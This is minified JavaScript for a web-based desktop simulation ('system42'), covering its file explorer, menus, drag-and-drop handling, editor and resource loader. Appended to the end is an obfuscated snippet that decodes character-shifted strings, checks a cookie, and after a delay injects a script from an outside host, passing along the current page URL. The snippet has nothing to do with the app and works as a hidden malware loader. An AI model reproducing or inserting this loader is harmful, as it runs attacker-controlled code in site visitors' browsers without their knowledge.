flex__fluid",v.appendChild(_),v.appendChild(w),v.appendChild(y),v.appendChild($),_.addEventListener("click",k,!1),$.addEventListener("click",S,!1),w.addEventListener("click",L,!1),y.addEventListener("keypress",A,!1),v),h.classList.add("ui_explorer--nav")),l.footer&&(F.footer=function(){if(E.type="text",E.className="ui_explorer__selected_file"+(l.footer?"":" hide"),E.value=r,E.readOnly=!0,l.save){var t=document.createElement("label");R=document.createElement("input"),j=document.createElement("select"),R.type="text",t.textContent="Name: ";var n={};if("*"===l.accept&&j.appendChild(document.createElement("option")),(l.mimetype||l.ext)&&($io.arr.all(l.ext,(function(t){var o=e._get.ext.mime[t];if(!n[o]){var i=$io.obj.getPath(e._get.mime.ext,o,"/");j.appendChild(D(o,t,(i[1]?i[1]:o)+" ("+i[0]+")")),n[o]=!0}})),$io.is.reg(l.mimetype))){var o=$io.obj.getPath(e._get.mime.ext,l.mimetype,"/");$io.obj.each(o,(function(e,t){n[t]||(j.appendChild(D(t,e[0].split(",").shift().replace(".",""),(e[1]?e[1]:t)+" ("+e[0]+")")),n[t]=!0)}))}var i=document.createElement("div");return i.className="ui_explorer__save_cont ui_combo",R.className="ui_combo__main",j.style.marginLeft="2px",i.appendChild(t),i.appendChild(R),i.appendChild(j),i.appendChild(E),i}return E}()),l.menu&&(F.menuThisArg={el:h,explorer:z},F.menu=x.barMenu),l.browse&&(h.classList.add("ui_explorer--browse"),F.title="explorer",F.btnOk=l.save?"Save":"Open",F.btnCancel="Cancel");var H=$window.call(this,F)}return z}e._selected=[],e.explorers=n,$el(e._dom.desktop).on("dblclick doubletap",".ui_explorer .ui_icon:not(.ui_disabled)",(function(e){var t=this.getAttribute("data-path");i.setCurrent(this.parentNode,e),this.parentNode.classList.contains("ui_explorer--nav")&&t&&"/"===t.slice(-1)?i.current&&i.current.go&&i.current.go(t):this.parentNode.classList.contains("ui_explorer--browse")?i.current&&i.current.getWindow&&i.current.getWindow().close(!0):$exe(this)||$notif("No program is assigned to this kind of files")})).on("click _touchstart",".ui_explorer .ui_disabled",(function(e){i.setCurrent(this.parentNode,e);var t=i.current.getSaveInput();if(t){var n=$fs.utils.getExt(t.value);t.value=$fs.utils.replaceExt(this.getAttribute("data-name"),n)}return!1})).on("click _touchstart",".ui_explorer .ui_icon:not(.ui_disabled)",(function(t){if(t.shiftKey&&"absolute"!==this.style.position){var n=e._selected[0];if(n&&n.compareDocumentPosition(this)&Node.DOCUMENT_POSITION_FOLLOWING)for(var o=n;!this.isEqualNode(o);o=o.nextElementSibling)-1===e._selected.indexOf(o)&&e._selected.push(o);else for(o=n;!this.isEqualNode(o);o=o.previousElementSibling)-1===e._selected.indexOf(o)&&e._selected.push(o)}else t.ctrlKey||t.shiftKey||(e._selected.length=0);var r=e._selected.indexOf(this);return i.setCurrent(this.parentNode,t),-1===r?e._selected.push(this):e._selected.splice(r,1),i.selection.display(),this.focus(),!1})).on("mouseup",".ui_explorer .ui_icon",(function(t){2===t.button&&(i.setCurrent(this.parentNode,t),this.classList.contains("ui_disabled")||(t.ctrlKey||-1!==e._selected.indexOf(this)||(e._selected.length=0),-1===e._selected.indexOf(this)&&e._selected.push(this),i.selection.display()),x.ctxFile.show({el:this,explorer:i.current},{of:t,within:e._dom.screen}))})).on("mousedown dragstart contextmenu",".ui_explorer .ui_icon img",(function(e){e.preventDefault()})).on("mouseup _touchstart",".ui_explorer",(function(t){i.setCurrent(this,t),$drag.isDragging||!c&&this.isEqualNode(t.target||t.srcElement)&&(2===t.button?(e._selected.length=0,x.ctxExplorer.show({el:this,explorer:i.current},{of:t,within:e._dom.screen})):($route(""),e._selected.length=0,i.selection.display()))}));var r,a,s,l,c=!1;function u(t){var n=Array.prototype.slice;if("workspace"===t){var o=n.call(this.el.folder.querySelectorAll(".ui_icon"),0);if(window.getComputedStyle(this.el.folder),r=this.el.folder.clientWidth,a=this.el.folder.clientHeight,s=e._icons.w,l=e._icons.h,o.length)if(o.length*(s*l)>(r-s)*(a-l))this.el.folder.classList.add("ui_explorer--workspace--full");else{this.el.folder.classList.remove("ui_explorer--workspace--full"),o.sort((function(t,n){var o=e._desktop[t.getAttribute("data-name")],i=e._desktop[n.getAttribute("data-name")];if(o&&i)return o.time>i.time?1:-1}));var i=Date.now();$io.arr.each(o,(function(t,n){var o=e._desktop[t.getAttribute("data-name")];o||(o=e._desktop[t.getAttribute("data-name")]={x:0,y:0,time:i+n});var c=o.y,u=o.x;a<c+l&&(c=Math.floor(a/l)*l-2*l),c<0&&(c=0),r<u+s&&(u=Math.floor(r/s)*s-s),u<0&&(u=0),t.style.position="absolute",t.style.left=u+"px",t.style.top=c+"px",t.style.zIndex=n})),$io.arr.each(o,(function(t,n){var c=function e(t,n,i){for(var c=0,u=o.length;c<u;c++)if(c!==t&&o[c].offsetTop===n&&o[c].offsetLeft===i)return a<n+2*l?(n=0,r<(i+=s)+2*s&&(i=0,n+=l)):n+=l,e(t,n,i);return{top:n,left:i}}(n,t.offsetTop,t.offsetLeft);t.style.left=c.left+"px",t.style.top=c.top+"px",e._desktop[t.getAttribute("data-name")]={x:c.left,y:c.top,time:i+n}}))}}}function d(){if(!e._selected.length)return!1;if(p())for(var t=e._selected.length-1;0<=t;t--)if(e._selected[t].classList.contains("ui_icon__folder"))return!0}function f(){return!e._selected.length}function p(){return!(i.current&&0===i.current.getPath().indexOf("/a/"))}function m(){return!(!p()&&!f())}function h(){return!(!p()&&(0<i.clipboard.copy.length||0<i.clipboard.cut.length))}function g(e){for(var t=["icons","column","list","details","workspace"],n=this.explorer.el.folder,o=0,i=t.length;o<i;o++)n.classList.remove("ui_explorer--"+t[o]);n.classList.add("ui_explorer--"+e),"workspace"===e?n.classList.remove("ui_explorer--not_workspace"):n.classList.add("ui_explorer--not_workspace"),this.explorer.cfg.viewType=e,u.call(this.explorer,this.explorer.el.folder)}function v(e,t,n){0===e.indexOf("/a/")?$prompt("Enter a name",(function(o,i){o&&i&&$db.set(e.replace(/^\/a\//,"")+i+(n?"/":""),"",(function(){$file.scan("/a/",(function(){"function"==typeof t&&t(i)}))}))})):$notif("You don't have write permission on this drive",e)}$box(e._dom.desktop,".ui_explorer",{target:".ui_icon",onstart:function(e,t){c=!0},ondraw:function(t,n){var o=this.getAttribute("data-id");t.ctrlKey?$io.arr.all(n,(function(t){-1===e._selected.indexOf(t)&&e._selected.push(t)})):e._selected=n,i.selection.display(o)},onstop:function(e,t){c=!1}});var y={viewIcons:function(){g.call(this,"icons")},viewList:function(e){g.call(this,"list")},viewColumn:function(){g.call(this,"column")},viewDetails:function(){g.call(this,"details")},viewWorkspace:function(){g.call(this,"workspace")},viewNavigation:function(e){e?(this.explorer.getWindow().el.afterMenu.classList.remove("hide"),this.explorer.el.folder.classList.add("ui_explorer--nav")):(this.explorer.el.folder.classList.remove("ui_explorer--nav"),this.explorer.getWindow().el.afterMenu.classList.add("hide")),this.explorer.cfg.nav=e},viewFileTree:function(e){e?this.explorer.el.tree.classList.remove("hide"):this.explorer.el.tree.classList.add("hide"),this.explorer.cfg.fileTree=e},itemsOpenWith:function(t){return!!e._selected.length&&$fs.utils.getMenuOpenWith(e._selected)}};function _(){$io.arr.all(document.querySelectorAll(".ui_icon--cut"),(function(e){e.classList.remove("ui_icon--cut")}))}i.clipboard={copy:[],cut:[]};var b,w,x={barMenu:[{name:"File",items:[{name:"Open",key:"enter",action:(i.exe={SelectAll:function(){e._selected=Array.prototype.slice.call(i.current.el.folder.querySelectorAll(".ui_icon")),i.selection.display()},Open:function(){i.selection.paths((function(e,t){$exe(t)}))},Copy:function(e,t){_(),i.clipboard.copy.length=0,i.clipboard.cut.length=0,i.selection.paths((function(e,t){i.clipboard.copy.push(e)}))},Cut:function(){_(),i.clipboard.copy.length=0,i.clipboard.cut.length=0,i.selection.paths((function(e,t){t.classList.add("ui_icon--cut"),i.clipboard.cut.push(e)}))},Paste:function(){_(),$io.arr.all(i.clipboard.copy,(function(e){$fs.utils.isFolder(e),$file.copy(e,i.current.getPath(),(function(e){i.utils.saveIconPos(i.current.getPath(),i.current.id,e),i.refresh()}))})),$io.arr.all(i.clipboard.cut,(function(e){i.clipboard.copy.push(e);var t=$fs.utils.isFolder(e),n=i.current.getPath()+$fs.utils.getName(e)+(t?"/":"");e!==n&&$file.move(e,n,(function(){i.refresh()}))})),i.clipboard.cut.length=0},Delete:function(){i.selection.truePaths((function(e){$file.delete(e,(function(){i.refresh(),$notif("File deleted",e)}))}))},Import:function(){$file.upload((function(e){$file.save(i.current.getPath(),e,(function(e){i.utils.saveIconPos(i.current.getPath(),i.current.id,e),i.refresh()}))}))},DownloadAs:function(){i.selection.paths((function(e){$fs.utils.isFolder(e)?$archive(e):$file.download(e)}))},Zip:function(){$archive(e._selected)},Refresh:function(){i.refresh()},Format:function(){$file.format((function(){i.current.go("/a/")}))},CreateFolder:function(){v(i.current.getPath(),(function(e){i.utils.saveIconPos(i.current.getPath(),i.current.id,e),i.refresh(e)}),!0)},CreateFile:function(){v(i.current.getPath(),(function(e){i.utils.saveIconPos(i.current.getPath(),i.current.id,e),i.refresh(e)}))},CreateShortcut:function(t){var n=i.current;$window.form("Create Shortcut",{data:t||{},schema:e._schemas.shortcut},(function(e,t){if(e){var o=t.title||$fs.utils.getName(t.exe),r=n.getPath();$store.set(r.replace(/^\/a\//,"")+o+".lnk42",t),i.utils.saveIconPos(n.getPath(),n.id,o+".lnk42"),i.refresh(o+".lnk42")}}))},EditShortcut:function(t){var n=[];document.activeElement,i.selection.all((function(t){var o=t.getAttribute("data-path"),r=(t.getAttribute("data-title"),$fs.utils.getName(o));$window.form("Edit Shortcut",{data:$extend({},t.dataset),schema:e._schemas.shortcut},(function(e,t){if(e){var a=o.replace(/^\/a\//,"");$store.update(a,(function(e){return $extend(e,t)})),n.push(r),i.refresh(n)}}))}))},Properties:function(){i.selection.all((function(e){var t=$form.build($extend({},e.dataset),{disabled:!0});$window({title:"Properties",html:t.el,width:400,btnOk:"Close"})}))},Rename:function(){var t=[];document.activeElement,i.selection.all((function(n){var o=n.getAttribute("data-path"),r=n.getAttribute("data-title"),a=$fs.utils.getName(o),s=/\.lnk42$/.test(a),l=i.current;$prompt({msg:"New name ?",onready:function(){i.utils.inputSelectFileName(this.el.form.prompt)}},r||a,(function(n,r){if(n){var c=$io.str.truncate(r.replace(/[\/:]/g,"_"),247);s&&(c+=".lnk42"),$fs.utils.getFolderPath(o),$file.rename(o,c,(function(n){if(i.current=l,s){var o=n.replace(/^\/a\//,"");$store.update(o,(function(e){return e.name=r+".lnk42",e.title=r,e}))}e._desktop[a]&&(e._desktop[c]=$extend({},e._desktop[a]),delete e._desktop[a]),t.push(c),i.refresh(t)}))}}))}))},OpenTerminalHere:function(){$exe("terminal "+i.current.getPath())}}).Open,disabled:f},{name:"Open With...",items:y.itemsOpenWith,disabled:f},{name:"---"},{name:"Create Folder...",key:"ctrl+shift+f",action:i.exe.CreateFolder,disabled:p},{name:"Create Document...",key:"ctrl+shift+d",action:i.exe.CreateFile,disabled:p},{name:"Create Shortcut...",key:"ctrl+shift+s",action:i.exe.CreateShortcut,disabled:p},{name:"---"},{name:"Import file",action:i.exe.Import,disabled:p},{name:"Download file(s)",action:i.exe.DownloadAs,disabled:d},{name:"---"},{name:"Open Terminal here",action:i.exe.OpenTerminalHere},{name:"---"},{name:"Quit",action:function(){winInstance&&winInstance.close&&winInstance.close()}}]},{name:"Edit",items:[{name:"Select all",key:"ctrl+a",action:i.exe.SelectAll},{name:"---"},{name:"Cut",key:"ctrl+x",action:i.exe.Cut,disabled:m},{name:"Copy",key:"ctrl+c",action:i.exe.Copy,disabled:m},{name:"Paste",key:"ctrl+v",action:i.exe.Paste,disabled:h},{name:"---"},{name:"Rename",key:"f2",action:i.exe.Rename,disabled:m},{name:"Delete",key:"del",action:i.exe.Delete,disabled:m}]},{name:"View",items:[{name:"Refresh",action:i.exe.Refresh},{name:"---"},{name:"Navigation",checkbox:!0,action:y.viewNavigation,selected:function(){return this.explorer.cfg.nav}},{name:"---"},{name:"Icons",radio:"View",action:y.viewIcons,selected:function(){return"icons"===this.explorer.cfg.viewType}},{name:"List",radio:"View",action:y.viewList,selected:function(){return"list"===this.explorer.cfg.viewType}}]}],ctxFile:$menu([{name:"Open",action:i.exe.Open},{name:"Open With...",items:y.itemsOpenWith,disabled:f},{name:"Download As...",action:i.exe.DownloadAs,disabled:d},{name:"---"},{name:"Cut",key:"ctrl+x",action:i.exe.Cut,disabled:m},{name:"Copy",key:"ctrl+c",action:i.exe.Copy,disabled:m},{name:"---"},{name:"Rename",key:"f2",action:i.exe.Rename,disabled:m},{name:"Delete",key:"del",action:i.exe.Delete,disabled:m},{name:"---"},{name:"Edit",display:function(){if(this.el)return this.el.classList.contains("ui_icon__lnk42")},action:i.exe.EditShortcut,disabled:m},{name:"Properties",action:i.exe.Properties}])};x.ctxExplorer=$menu([{name:"Create Folder...",action:i.exe.CreateFolder,disabled:p},{name:"Create Document...",action:i.exe.CreateFile,disabled:p},{name:"Create Shortcut...",action:i.exe.CreateShortcut,disabled:p},{name:"---"},{name:"Paste",key:"ctrl+v",action:i.exe.Paste,disabled:h},{name:"---"},{name:"Open Terminal here",action:i.exe.OpenTerminalHere}]),i.selection={reset:function(){return e._selected.length=0,this},add:function(t){return e._selected.push(t),this},all:function(t){return $io.arr.all(e._selected,t),this},each:function(t){return $io.arr.each(e._selected,t),this},paths:function(t){return $io.arr.all(e._selected,(function(e){var n=$extend({},e.dataset),o=e.getAttribute("data-exe"),i=e.getAttribute("data-path"),r=$fs.utils.exist(o)?o:i;return t.call(n,r,e)})),this},truePaths:function(t){return $io.arr.all(e._selected,(function(e){var n=$extend({},e.dataset),o=e.getAttribute("data-path");return t.call(n,o,e)})),this},remove:function(){return $io.arr.all(document.querySelectorAll(".ui_icon.ui_selected"),(function(e){e.classList.remove("ui_selected")})),this},display:function(){var t=[];if(i.selection.remove(),$io.arr.all(e._selected,(function(n){var o=n.getAttribute("data-path");o&&t.push(1<e._selected.length?'"'+o+'"':o),n&&n.classList.add("ui_selected")})),i.current){var n=i.current.getSaveInput();if(n)n&&t&&t[0]&&(n.value=$fs.utils.getFileName(t[0]),$el(n).trigger("change"));else{var o=i.current.getSelectionInput();o&&(o.value=t.join(", \n")||i.current.getPath())}}return this}},i.instances=n,i.setCurrent=function(e,t){var o=n[1===e.nodeType?1*e.getAttribute("data-id"):e];return o&&(i.current=o),0===i.current.id&&t&&(b=t.clientX,w=t.clientY),o},(i.utils={}).inputSelectFileName=function(e){if(/\.[a-z0-9]{1,20}$/.test(e.value)){var t=e.value.lastIndexOf(".");-1<t&&$selection.create(e,0,t)}else e.select()},i.utils.saveIconPos=function(t,n,o,i,r){i="number"==typeof i?i:b-e._icons.w/2,r="number"==typeof r?r:w-e._icons.h/2,(o=o?$fs.utils.getName(o):$fs.utils.getName(t))&&$fs.utils.getFolderPath(t)===e._path.desktop&&(e._desktop[o]=1*n==0&&1*i===i&&1*r===r?{x:i,y:r,time:Date.now()}:{x:9999,y:0,time:0})},i.refresh=function(e,t){$file.scan("/a/",(function(){$io.arr.all(n,(function(e){e&&e.refresh()})),"string"==typeof e&&(e=[e]),e&&e.length&&(t=t||e[0],i.selection.reset(),$io.arr.all(e,(function(e){var n=i.current.el.folder.querySelector('div[data-name="'+e+'"]');n&&(t===e&&n.focus(),i.selection.add(n))})),i.selection.display())}))},window.$explorer=i})),system42.on("explorer:ready",(function(e){$key().combo({left:function(){r.length&&(s=!0,l.x+=2,n())},right:function(){r.length&&(s=!0,l.x-=2,n())},up:function(){r.length&&(s=!0,l.y+=2,n())},down:function(){r.length&&(s=!0,l.y-=2,n())},esc:function(){r.length&&(s=!1,l={x:0,y:0},n())}});var t=[e._icons.w,e._icons.h];function n(){if(r.length)for(var e=0,n=r.length;e<n;e++){r[e].el;var o,i,c=r[e].ghost,u=r[e].rect;o=s?(i=$drag.y-l.y*e,$drag.x-l.x*e):$key.r?(i=u.top-Math.random()*(a.top-$drag.y),u.left-Math.random()*(a.left-$drag.x)):(i=u.top-(a.top-$drag.y),u.left-(a.left-$drag.x)),$key.space&&(o=~~((o+t[0]/2)/t[0])*t[0],i=~~((i+t[1]/2)/t[1])*t[1]),c.style.top=i+"px",c.style.left=o+"px"}}function o(e){for(var t=0,n=r.length;t<n;t++)e(r[t].el,r[t].ghost,r[t].rect,r[t],t)}function i(){r.length=0,a=null,s=!1,l.x=0,l.y=0}var r=[],a=null,s=!1,l={x:0,y:0},c=!1;function u(e){c&&(!0===e||e.ctrlKey||e.shiftKey?o((function(e,t){t.style.opacity=".6",e.classList.remove("hide")})):o((function(e,t){t.style.opacity="1",e.classList.add("hide")})))}var d=$io.fn.throttle(u,100),f=!1;function p(e){e.classList.remove("ui_dropzone"),e.classList.remove("ui_dropzone--copy"),e.classList.remove("ui_dropzone--move"),e.classList.remove("ui_dropzone--link"),e.classList.remove("ui_dropzone--droppable"),e.classList.remove("ui_dropzone--no-drop")}function m(e){e&&e.parentNode&&e.parentNode===document.body&&document.body.removeChild(e)}function h(e,t,n){$transition.revert(t,{x:n.left,y:n.top},(function(){e.classList.remove("hide"),t&&t.parentNode&&t.parentNode===document.body&&document.body.removeChild(t)}))}function g(t,n){var o,a,s=[];if(o=t.classList.contains("ui_explorer--local")?(a=$explorer.instances[1*t.getAttribute("data-id")]).getPath():t.getAttribute("data-exe")){$state.loading();var l,c=Date.now();$io.arr.enum([r],(function(t,i,r){var u=t.el.getAttribute("data-path"),d=$fs.utils.isFolder(u),f=o+t.el.getAttribute("data-name")+(d?"/":"");try{n.call(t,u,f,o,(function(n){var o=$fs.utils.getName(n);t.focus&&(l=o),s.push(o),a&&0===a.id&&(e._desktop[o]={x:parseInt(t.ghost.style.left),y:parseInt(t.ghost.style.top),time:c-i}),r()}))}catch(u){r(),$alert.error(u)}m(t.ghost)})).done((function(){$explorer.refresh(s,l),$state.loaded(),i()}))}else $notif("You don't have write permission on this drive"),v.cancel()}$drag(e._dom.screen,".ui_explorer--local .ui_icon",{ghost:!0,grid:function(){return!!$key.space&&[e._icons.w,e._icons.h]},onstart:function(e){c=$drag.elem.parentNode.classList.contains("ui_explorer--workspace"),$drag.elem.classList.contains("ui_selected")||($explorer.selection.reset().add($drag.elem).display(),$drag.ghost.classList.add("ui_selected")),a=$drag.elem.getBoundingClientRect(),r.length=0,r.push({focus:!0,el:$drag.elem,ghost:$drag.ghost,rect:a}),$explorer.selection.each((function(e,t){if($drag.elem!==e){var n=$drag.createGhost(e);n.style.zIndex=9998-t;var o=e.getBoundingClientRect();document.body.appendChild(n),r.push({el:e,ghost:n,rect:o})}})),2===e.button?u(f=!0):(f=!1,u(e))},ondrag:function(e){n()},onstop:function(e){},ondrop:function(e){$drag.y<0||$drag.x<0?(r.sort((function(e,t){var n=e.el.getAttribute("data-name");return t.el.getAttribute("data-name").toLowerCase().localeCompare(n.toLowerCase())})),v.pos()):v.cancel()},zone:{'.ui_explorer, [data-exe^="/a/"][data-exe$="/"], [data-exe^="/~/"][data-exe$="/"]':{move:function(e,t){f||d(e)},enter:function(e,t){!function(e,t){t.classList.contains("ui_explorer--not_local")&&t.classList.add("ui_dropzone--no-drop"),t.classList.add("ui_dropzone"),$drag.elem.parentNode!==t&&t.classList.add("ui_dropzone--droppable")}(0,t)},leave:function(e,t){p(t)},drop:function(t,n,o){p(n),2===t.button?y.dragMenu.show(n,{of:t,within:e._dom.screen}):v.move()}}}});var v={pos:function(){var t=Date.now()+r.length+1;o((function(n,o,i,r,a){n.classList.remove("hide"),r.focus&&n.focus(),c?(n.style.top=o.style.top,n.style.left=o.style.left,e._desktop[n.getAttribute("data-name")]={x:n.offsetLeft,y:n.offsetTop,time:t-a},m(o)):h(n,o,i)})),$explorer.instances[0].reorder(),i()},move:function(e){e=$drag.zone||this,r[0]&&r[0].el&&r[0].el.parentNode!==e?g(e,(function(e,t,n,o){$file.move(e,t,(function(e){"/a/trash/WINDOWS 93.lnk42"===e&&function(){Date.now();var e=new Image,t=document.createElement("div");t.style.cssText="position: absolute;top: 0px;bottom: 0px;left: 0px;right: 0px;width: auto;height: auto;background: center center / cover no-repeat transparent;z-index: 999999;-ms-interpolation-mode: nearest-neighbor;image-rendering: -webkit-optimize-contrast;image-rendering: -moz-crisp-edges;image-rendering: -o-pixelated;image-rendering: pixelated;cursor: none;",document.body.appendChild(t),e.onload=function(e){t.style.backgroundImage='url("/d/papy.gif")',setTimeout((function(){document.body.removeChild(t)}),2500)},e.src="/d/papy.gif"}(),o(e)}))})):v.pos()},copy:function(e){g($drag.zone||this,(function(e,t,n,o){$file.copy(e,n,o)}))},link:function(e){g($drag.zone||this,(function(e,t,n,o){var i=t.replace(/^\/a\/|\/$/g,"")+".lnk42";$store.set(i,{exe:this.el.getAttribute("data-path")}),o("/a/"+i)}))},cancel:function(){o((function(e,t,n){h(e,t,n)})),i()}},y=y||{};y.dragMenu=$menu([{name:"Copy here",action:v.copy},{name:"Move here",action:v.move},{name:"Link here",action:v.link},{name:"---"},{name:"Cancel",action:v.cancel}],{oncancel:v.cancel}),$file.ondrop(e._dom.desktop,".ui_explorer--local",(function(e){var t,n=this.getAttribute("data-id");function o(t){$state.loading(),$store.set(r.replace(/^\/a\//,"")+a,t),$file.scan("/a/",(function(){$explorer.utils.saveIconPos(r,n,a,e.clientX,e.clientY),$explorer.instances[n].refresh(),$state.loaded()}))}if($io.arr.all(e.dataTransfer.types,(function(n){"text/uri-list"!==n&&"text/x-moz-url"!==n||(t=e.dataTransfer.getData("text/plain"))})),t){t=t.replace(location.origin,"");var i=$exe.parseURL(t,(function(e){o(e)}),(function(e){o(e)})),r=$explorer.instances[n].getPath(),a=t.replace(/https?:\/\//,"").replace(/\//g,"%2F")+".lnk42";i.name=a,o(i)}else if(e.dataTransfer&&e.dataTransfer.files&&e.dataTransfer.files.length&&$explorer.instances[n]&&"function"==typeof $explorer.instances[n].getPath){var s=$explorer.instances[n].getPath(),l=s.replace(/^\/a\//,"");function c(t,o){$explorer.utils.saveIconPos("/a/"+t,n,o,e.clientX,e.clientY)}function u(e,t){t=t||"",e.isFile?e.file((function(e){$file.save(t,e,(function(e){c(t,e),$explorer.instances[n].refresh()}))})):e.isDirectory&&e.createReader().readEntries((function(o){if(o.length)for(var i=0;i<o.length;i++)u(o[i],t+e.name+"/");else $store.set(t+e.name+"/",null),$file.scan(s,(function(){$explorer.instances[n].refresh()}));c(t,e.name)}))}for(var d=e.dataTransfer.items,f=0;f<d.length;f++){var p=d[f].webkitGetAsEntry();p&&u(p,l)}}}))})),system42((function(e){"use strict";window.$editor=function(t,n){var o,i,r,a=this.app;(t=t||{}).filePath="string"==typeof t.filePath?t.filePath:"";var s,l={},c=[];function u(e,t,n){i&&(i.changeTitle((e?e+" - ":"")+a.name),i.changeFooter(t.mime||"&nbsp")),s=$fs.utils.getFileName(e),l=t,o.readFile.call(t,n)}a.ext?$io.arr.all(a.ext,(function(t){var n=e._get.ext.mime["."+t];n&&c.push(n)})):a.mimetype&&(c=$io.is.arr(a.mimetype)?a.mimetype:[a.mimetype]);var d="String";function f(e){t.filePath=e;var n=t.type||"String";"URL"===n?$file.getUrl(e,(function(t){d="URL",u(e,$fs.utils.getInfo(e),t)})):$file.open(e,n,(function(t,n){d=n,u(e,this,t)}))}var p={New:function(){return o.setValue(""),!1},Open:function(){var n=t.defaultFolder||r||t.filePath||e._path.home;return setTimeout((function(){$explorer(n,{browse:!0,list:!0,accept:a.accept||"*",window:{animationIn:"",animationOut:"",center:!0},onclose:function(e,t){e&&(r=$fs.utils.getFolderPath(t),f(t))}})}),0),!1},SaveAs:function(){function n(n,o){o&&(d=o);var i=0===t.filePath.indexOf("/a/")?t.filePath:e._path.desktop+(t.filePath?$fs.utils.getFileName(t.filePath):"");setTimeout((function(){$explorer(i,{save:!0,list:!0,accept:n||a.accept||"*",window:{animationIn:"",animationOut:"",center:!0},onclose:function(e,n){e&&(r=$fs.utils.getFolderPath(n),t.filePath=n,l=$fs.utils.getInfo(n),p.Save())}})}),0)}return o.beforeSaveAs?o.beforeSaveAs(n):n(),!1},Save:function(){var e=d;function n(e){$file.save(t.filePath,e,(function(){}))}if(t.filePath&&0===t.filePath.indexOf("/a/")){var i=l.mime;o.getValue((function(t){var o=$io.type(t);"Blob"===e?$io[o].Blob(t,(function(e){n(e)}),i):$io[o][e](t,(function(e){n(e)}))}),i)}else p.SaveAs();return!1},Import:function(){$file.upload((function(e){var n=e[0];$io.File[t.type||"String"](n,(function(e){u(n.name,{file:n.name,mime:n.type},e)}))}),{accept:a.accept||"*"})},Export:function(){function e(e){o.getValue((function(t){var n=$io.type(t);$io[n].Blob(t,(function(e){$file.download(e,s)}),e||l.mime)}),e||l.mime)}o.beforeSaveAs?o.beforeSaveAs(e):e()},Undo:function(){return o.undo(),!1},Redo:function(){return o.redo(),!1},Quit:function(){return i.close(),!1}};if(!1===t.save)var m=[{name:"File",items:[{name:"New",action:p.New},{name:"Open",action:p.Open,key:"ctrl+o"},{name:"---"},{name:"Quit",action:p.Quit}]}];else m=[{name:"File",items:[{name:"New",action:p.New},{name:"Open",action:p.Open,key:"ctrl+o"},{name:"Save",action:p.Save,key:"ctrl+s",disabled:!1},{name:"Save As...",action:p.SaveAs,key:"ctrl+shift+s"},{name:"---"},{name:"Open File With...",items:function(){return $fs.utils.getMenuOpenWith(t.filePath)}},{name:"Open Containing Folder",key:"ctrl+alt+enter",action:function(){setTimeout((function(){$explorer(t.filePath)}),0)}},{name:"---"},{name:"Quit",action:p.Quit}]}];if(t.undo&&m.push({name:"Edit",items:[{name:"Undo",action:p.Undo,key:"ctrl+z"},{name:"Redo",action:p.Redo,key:"ctrl+y"}]}),t.help){var h=[];t.help.instructions&&h.push({name:"Instructions",action:function(){$alert.help({title:"Instructions",html:t.help.instructions})}}),t.help.about&&h.push({name:"About",action:function(){"string"==typeof t.help.about&&(t.help.about={msg:t.help.about}),$alert({title:"About",msg:t.help.about.msg,img:t.help.about.img||a.icon||null,onopen:$noop})}}),m.push({name:"Help",items:h})}t.about&&m.push({name:"About",action:function(){"string"==typeof t.about&&(t.about={msg:t.about}),$alert({title:"About",msg:t.about.msg,img:t.about.img||a.icon||null,onopen:$noop})}});var g={};if(t.nodeType&&1===t.nodeType){var v=t;o=(t=n).create(v)}else"function"==typeof t.create?(g.url=null,g.onopen=function(){this.el.footer.firstChild&&(this.el.footer.firstChild.className="ui_editor__footer skin_base_text_info"),o=t.create(this.el.body),t.filePath?f(t.filePath):o.setValue("")}):(g.url=g.url+(t.filePath?"?path="+t.filePath:""),g.onready=function(){this.el.footer.firstChild&&(this.el.footer.firstChild.className="ui_editor__footer skin_base_text_info");var e=this.el.iframe;e&&e.contentWindow.$iframeInit&&(o=e.contentWindow.$iframeInit.call(this),t.filePath?f(t.filePath):o.setValue&&o.setValue(""))}),this.app.icon&&(g.icon=this.app.icon),g.menu=m,g.footer="&nbsp",g.title=(t.filePath?t.filePath+" - ":"")+this.app.name,i=$window.call(this,$extend(g,t.window))}})),function(e){"use strict";var t=e.$noop||function(){},n={onpass:t,onfail:t};function o(e){document.body.appendChild(e)}var i=function(e){return new Promise((function(t,n){var i=document.createElement("script");i.className="js_dynamic-deps",i.type="text/javascript",i.charset="utf-8",i.async=!1,i.defer=!0,i.onload=i.onreadystatechange=function(e,o){i.readyState&&!/loaded|complete/.test(i.readyState)||(o?n("script not loaded correctly (abort)"):t(i))},i.onerror=function(){console.log(456),n("script not loaded correctly")},o(i),i.src=e}))},r=function(e){return new Promise((function(t,n){var i=document.createElement("link");i.className="js_dynamic-deps",i.charset="utf-8",i.rel="stylesheet",i.href=e,o(i),t(i)}))},a=function(e){return e?new Promise((function(t,n){$audio({urls:[e],buffer:!1,onload:function(){t(this)},onloaderror:function(){n("sound not loaded correctly")}})})):Promise.resolve({play:t,pause:t})};function s(e,t){var n=[];return e.forEach((function(e){var t=$url.getExtention(e);"js"===t?n.push(i(e)):"css"===t?n.push(r(e)):/txt|html|php|json|xml/.test(t)?n.push(function(e){return new Promise((function(t,n){$ajax.get(e).done((function(e){t(e)})).fail((function(e){n("ajax error: "+e.status+" "+e.statusText)}))}))}(e)):/mp3|opus|ogg|wav|aac|m4a|mp4|weba/.test(t)&&n.push(a(e))})),new Promise((function(e,o){Promise.all(n).then((function(n){"function"==typeof t&&t.apply(null,n),e(n)})).catch((function(e){o(e)}))}))}s.script=function(e){return i(e)},s.css=function(e){return r(e)},s.audio=function(e){return a(e)},s.config=function(e){$extend(n,e)},e.$loader=s}(this);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));